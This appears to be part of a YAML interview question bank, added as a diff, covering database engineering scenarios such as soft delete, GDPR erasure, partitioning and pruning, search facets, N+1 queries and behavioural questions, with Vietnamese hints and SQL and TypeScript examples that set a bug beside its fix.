+      - "Says materialized views update automatically in Postgres"
+    tags: [reporting, materialized-view, locks]
+  - id: scenario-data-051
+    level: senior
+    type: design
+    q: >-
+      Leadership asks whether to "just add more replicas" or build a data warehouse for analytics. You have 2 TB in Postgres, 40 internal report queries,
+      and a data team asking for joins with CRM and billing data. Make the call.
+    hint: |-
+      Tiêu chí: (1) loại query — scan/aggregate trên nhiều tháng → columnar thắng row store nhiều lần; (2) cần join **nhiều nguồn** (CRM, billing) → replica Postgres không làm được; (3) độ tươi cần thiết (phút? giờ?); (4) ai viết query — analyst ad-hoc query có thể giết OLTP replica; (5) chi phí và đội vận hành.
+      Khuyến nghị có lộ trình: ngay — replica riêng cho reporting + summary table cho 5 dashboard nóng; song song — CDC (Debezium/managed) hoặc ETL vào warehouse, mô hình hoá (dbt), chuyển dần 40 report; giữ OLTP chỉ phục vụ product.
+      Rủi ro: PII chảy sang warehouse (masking, access control), schema change phá pipeline (contract/schema registry), hai nguồn số liệu lệch (định nghĩa metric một chỗ).
+      Câu chốt: replica mở rộng **năng lực đọc cùng một schema**; warehouse đổi **mô hình lưu trữ và phạm vi dữ liệu**.
+    followUp: Finance says the warehouse revenue number differs from the app's by 0.3%. How do you find out which one is right?
+    tags: [reporting, warehouse, cdc, system-design]
+  - id: scenario-data-052
+    level: medium
+    type: debug
+    q: >-
+      You added soft delete to `users`. Now a user who deleted their account cannot sign up again with the same email, and a support page shows deleted users.
+      Fix both.
+    hint: |-
+      (1) `UNIQUE (email)` vẫn tính row đã soft-delete → thay bằng **partial unique index** `WHERE deleted_at IS NULL` (Postgres, SQL Server filtered index). MySQL không có partial index → dùng generated column hoặc `UNIQUE(email, deleted_token)`.
+      (2) Query quên `deleted_at IS NULL` → soft delete là **cross-cutting**: dùng view `active_users`, default scope/global filter của ORM (Prisma extension, TypeORM `@DeleteDateColumn` tự lọc), hoặc Row Level Security; test cho mọi query.
+      Hiệu năng: partial index `WHERE deleted_at IS NULL` cho các query nóng; nếu tỷ lệ row đã xoá lớn → archive/hard delete định kỳ.
+    example: |-
+      ```sql
+      -- BUG
+      ALTER TABLE users ADD CONSTRAINT users_email_key UNIQUE (email);
+      -- FIX
+      ALTER TABLE users DROP CONSTRAINT users_email_key;
+      CREATE UNIQUE INDEX CONCURRENTLY users_email_active_uq ON users (lower(email)) WHERE deleted_at IS NULL;
+      CREATE VIEW active_users AS SELECT * FROM users WHERE deleted_at IS NULL;
+      ```
+    followUp: Other tables have FKs to `users`. What does a foreign key mean when the parent is soft-deleted?
+    redFlags:
+      - "Appends a random suffix to the deleted user's email as the only fix"
+    tags: [soft-delete, unique, index]
+  - id: scenario-data-053
+    level: senior
+    type: open
+    q: >-
+      A user invokes their GDPR right to erasure. Your system soft-deletes users, keeps nightly backups for 35 days, replicates to Elasticsearch and a warehouse,
+      and has old CSV exports in S3. What does "deleted" mean here, and how do you implement it?
+    hint: |-
+      Soft delete **không phải** erasure. Cần một **erasure workflow**: xác định mọi nơi có PII (data inventory), hard delete hoặc **anonymize** (giữ order cho kế toán nhưng xoá tên/email/địa chỉ), phát event `user.erased` để ES/warehouse/cache/search xoá theo, xoá hoặc để hết hạn file export trong S3 (lifecycle), và log bằng chứng (không chứa PII).
+      Backup: thường không sửa được backup → chính sách giữ ngắn + đảm bảo khi restore thì **chạy lại danh sách erasure** trước khi dùng. **Crypto-shredding**: mã hoá PII bằng key riêng từng user, xoá key = dữ liệu ở mọi bản sao không đọc được.
+      Nghĩa vụ giữ lại (hoá đơn, AML) có thể thắng quyền xoá → cần tư vấn pháp lý; thời hạn phản hồi thường 1 tháng (verify).
+      Senior: đây là thiết kế từ đầu (PII tách bảng, tenant/user key), không phải script lúc có yêu cầu.
+    followUp: How would you prove to an auditor that the user's data is gone from Elasticsearch and the warehouse?
+    tags: [soft-delete, gdpr, privacy]
+    verify: true
+  - id: scenario-data-054
+    level: senior
+    type: design
+    q: >-
+      `orders` has 2B rows, grows 3M a day, and 95% of queries touch the last 90 days, but customers can open any order from 7 years ago.
+      Design partitioning and archiving. How do you choose the partition key?
+    hint: |-
+      Partition key = cột có trong **hầu hết WHERE** và phù hợp với **retention**: `created_at` theo tháng (≈ 90M row/partition) → pruning cho query 90 ngày, retention = detach partition. `tenant_id` (hash/list) hợp khi mọi query theo tenant và cần cô lập tenant lớn; có thể **sub-partition** nhưng số partition bùng nổ.
+      Ràng buộc Postgres: PK/unique phải **chứa partition key** → `PRIMARY KEY (id, created_at)`; mở order theo `id` thì không pruning được → encode thời gian trong id (UUIDv7/snowflake) hoặc giữ lookup `order_id → created_at`, hoặc URL mang ngày.
+      Cold data: partition > 2 năm chuyển sang tablespace rẻ hơn, hoặc detach → export Parquet lên S3 (query qua Athena) và để API "đọc lạnh" chậm hơn với SLA khác; FK từ bảng khác vào partitioned table được hỗ trợ (PG12+) nhưng cân nhắc chi phí.
+      Vận hành: tạo trước partition tương lai (pg_partman), giữ số partition vừa phải (hàng trăm, không phải chục nghìn — planning time), index tạo trên bảng cha tự lan xuống.
+    followUp: A customer support tool searches orders by email across all 7 years. What happens to that query after partitioning?
+    redFlags:
+      - "Partitions by id range without relating it to how data is queried or retained"
+      - "Expects partitioning alone to speed up every query"
+    tags: [partitioning, archiving, system-design]
+    verify: true
+  - id: scenario-data-055
+    level: hard
+    type: gotcha
+    q: >-
+      After partitioning `events` by month, some queries got slower, and `EXPLAIN` shows all 84 partitions being scanned. Give the reasons and fixes.
+    hint: |-
+      Pruning chỉ xảy ra khi planner/executor suy ra được partition từ điều kiện trên **partition key**:
+      (1) query không filter theo `created_at` (lọc theo `id`, `user_id`) → quét mọi partition; (2) bọc key trong function/cast (`created_at::date = ...`, `date_trunc(...)`) → không prune; (3) so với biểu thức không ổn định lúc plan — `now()` vẫn prune được ở **execution time** (runtime pruning, PG11+), plan hiện "Subplans Removed"; (4) `enable_partition_pruning = off`.
+      Thêm: quá nhiều partition → planning time và memory tăng; join giữa hai bảng partition cần `enable_partitionwise_join`.
+      Fix: thêm range `created_at` vào query (API bắt buộc có khoảng ngày), id mang thời gian, index local theo cột lọc phổ biến.
+    example: |-
+      ```sql
+      -- scans all partitions
+      SELECT * FROM events WHERE user_id = 42 ORDER BY created_at DESC LIMIT 20;
+      SELECT * FROM events WHERE created_at::date = '2026-09-01';
+      -- prunes
+      SELECT * FROM events
+      WHERE user_id = 42 AND created_at >= now() - interval '30 days'
+      ORDER BY created_at DESC LIMIT 20;
+      ```
+    followUp: How does `ORDER BY created_at DESC LIMIT 20` across partitions work, and can Postgres stop early?
+    tags: [partitioning, pruning]
+    verify: true
+  - id: scenario-data-056
+    level: hard
+    type: scenario
+    q: >-
+      A product search page over 50M products shows facet counts (brand, price range, color) next to results. p99 is 6 seconds on Postgres.
+      How do you fix it?
+    hint: |-
+      Facet = một `GROUP BY` cho mỗi chiều trên **toàn bộ tập kết quả khớp**, không chỉ 20 row đang hiển thị → với filter rộng là quét hàng triệu row × số facet.
+      Lựa chọn: (1) chuyển search sang **Elasticsearch/OpenSearch**: `terms`/`range` aggregations trong một request, dữ liệu columnar (doc values); lưu ý `terms` trên nhiều shard là **xấp xỉ** (shard_size), và `track_total_hits` mặc định chỉ đếm chính xác tới 10.000 (verify); (2) ở Postgres: facet cho **truy vấn không filter/phổ biến** tính trước (summary table), cache theo filter hash vài phút, count xấp xỉ/"1.000+"; (3) UX: tải facet **async** sau kết quả, giới hạn số facet, chỉ đếm top N giá trị.
+      Đồng bộ ES từ DB bằng outbox/CDC (xem câu read model).
+    followUp: Users complain that the facet says "Nike (1,204)" but clicking it shows 1,197 results. Explain.
+    redFlags:
+      - "Runs COUNT(*) GROUP BY for each facet on every keystroke"
+    tags: [search, facets, elasticsearch, count]
+    verify: true
+  - id: scenario-data-057
+    level: medium
+    type: debug
+    q: >-
+      This list endpoint makes 51 queries per page. A teammate "fixed" it with a JOIN, and now pages contain fewer than 20 orders. Explain both bugs.
+    hint: |-
+      Bug 1 — **N+1**: 1 query lấy 20 order + 1 query items cho **mỗi** order (thêm 1 cho customer...) → 8 ms × 51 = 400 ms, và tăng theo page size.
+      Bug 2 — **JOIN + LIMIT**: `LIMIT 20` áp dụng trên **row đã join** (order × items), không phải trên order → order có 5 item chiếm 5 row → trang chỉ còn 4–5 order, và order cuối có thể bị cắt mất item.
+      Fix: phân trang **order trước** (subquery/CTE với keyset), rồi (a) một query `WHERE order_id = ANY($ids)` cho items và ghép trong code (2 query tổng cộng), hoặc (b) `json_agg` items trong subquery `LATERAL`. ORM: `include` của Prisma thường chạy query riêng theo `IN`, không phải JOIN (verify theo version/`relationLoadStrategy`).
+    example: |-
+      ```ts
+      // BUG 1: N+1
+      const orders = await db.query("SELECT * FROM orders WHERE tenant_id=$1 ORDER BY id DESC LIMIT 20", [t]);
+      for (const o of orders.rows) o.items = (await db.query("SELECT * FROM order_items WHERE order_id=$1", [o.id])).rows;
+
+      // BUG 2: LIMIT counts joined rows
+      SELECT o.*, i.* FROM orders o JOIN order_items i ON i.order_id = o.id
+      WHERE o.tenant_id = $1 ORDER BY o.id DESC LIMIT 20;
+
+      // FIX
+      SELECT o.*, coalesce(it.items, '[]') AS items
+      FROM (SELECT * FROM orders WHERE tenant_id = $1 AND id < $2 ORDER BY id DESC LIMIT 20) o
+      LEFT JOIN LATERAL (
+        SELECT json_agg(i ORDER BY i.id) AS items FROM order_items i WHERE i.order_id = o.id
+      ) it ON true
+      ORDER BY o.id DESC;
+      ```
+    followUp: How would you catch N+1 regressions automatically in CI or in production?
+    redFlags:
+      - "Fixes N+1 with Promise.all over the 20 queries and calls it solved"
+    tags: [n-plus-one, pagination, orm, debug]
+    verify: true
+  - id: scenario-data-058
+    level: senior
+    type: open
+    q: >-
+      You are the new tech lead for a service whose main table grows 5x a year and is at 300M rows. Nothing is on fire yet. What do you put in place now so that
+      pagination, exports, deletes and slow queries don't become incidents in two years?
+    hint: |-
+      Nguyên tắc: biến quyết định thành **guardrail mặc định**, không phụ thuộc trí nhớ từng người.
+      - API: keyset là mặc định cho list mới; max page size; filter/sort allow-list có index; không trả total chính xác mặc định.
+      - DB: `statement_timeout`, `lock_timeout`, `idle_in_transaction_session_timeout` theo role; `pg_stat_statements` + `auto_explain` bật sẵn; alert trên bloat, replica lag, slot lag, xmin age, disk.
+      - Dữ liệu: quyết định retention **ngay bây giờ** và partition theo thời gian trước khi bảng quá lớn để chuyển; archive policy; soft delete có job dọn.
+      - Job nặng: framework chung cho batch (checkpoint, throttle theo lag, kill switch) và export/import (async, stream, per-tenant quota); reporting ra replica/warehouse.
+      - Quy trình: review migration (lint cho `ADD COLUMN ... DEFAULT volatile`, index không CONCURRENTLY, thiếu `lock_timeout`), load test với data cỡ production, capacity plan theo quý.
+      Senior: ưu tiên theo rủi ro × chi phí, không làm hết cùng lúc; chọn 2–3 thứ có đòn bẩy cao nhất (timeouts, retention/partition, keyset).
+    followUp: You can only get one quarter of engineering time for this. What do you pick and how do you justify it to the product manager?
+    tags: [senior, operations, strategy]
+  - id: scenario-data-059
+    level: cv
+    type: behavioral
+    q: >-
+      Tell me about a time you made a large data export or import faster or safer. What was the bottleneck, what did you measure, and what changed?
+    hint: |-
+      STAR: **S** — khối lượng (số row/file, tần suất), triệu chứng (timeout, OOM, job chạy bao lâu). **T** — mục tiêu cụ thể (dưới X phút, không ảnh hưởng checkout). **A** — đo trước (thời gian mỗi giai đoạn: đọc DB / transform / ghi), thay đổi chính (stream thay vì buffer, `COPY`/staging thay vì insert từng row, batch + checkpoint, async job, chạy trên replica), cách validate kết quả đúng (count, checksum, error report). **R** — con số trước/sau (40 phút → 2 phút, memory 3 GB → 80 MB).
+      Reflection: điều bạn sẽ làm khác (idempotency ngay từ đầu, test với dữ liệu cỡ production, metric cho job).
+      Chuẩn bị trả lời follow-up: xử lý dòng lỗi, chạy lại thì sao, ảnh hưởng tới DB production.
+    followUp: What would have happened if the job had been retried halfway through, before your change and after it?
+    redFlags:
+      - "No numbers, only 'it became much faster'"
+      - "Describes the team's work without saying what they personally did"
+    tags: [cv, behavioral, import, export]
+  - id: scenario-data-060
+    level: cv
+    type: behavioral
+    q: >-
+      Tell me about a time a query or endpoint got slow in production. How did you find the root cause, and what did you do so it wouldn't happen again?
+    hint: |-
+      STAR: **S** — endpoint nào, p99 trước/sau, ảnh hưởng người dùng. **T** — khôi phục nhanh + tìm root cause. **A** — trình tự điều tra (APM trace → `pg_stat_statements` → `EXPLAIN (ANALYZE, BUFFERS)`), root cause cụ thể (OFFSET sâu, thiếu index khớp ORDER BY, stats cũ, lock queue, N+1), fix ngắn hạn và dài hạn, cách kiểm chứng (plan mới, số buffer, p99).
+      **R** — con số (4 s → 40 ms) và guardrail thêm vào (timeout, alert, migration lint, runbook).
+      Reflection: tín hiệu nào lẽ ra đã cảnh báo sớm hơn.
+    followUp: How did you make sure the new index didn't slow down writes or break another query?
+    redFlags:
+      - "Root cause is 'the database was slow'"
+    tags: [cv, behavioral, slow-query]
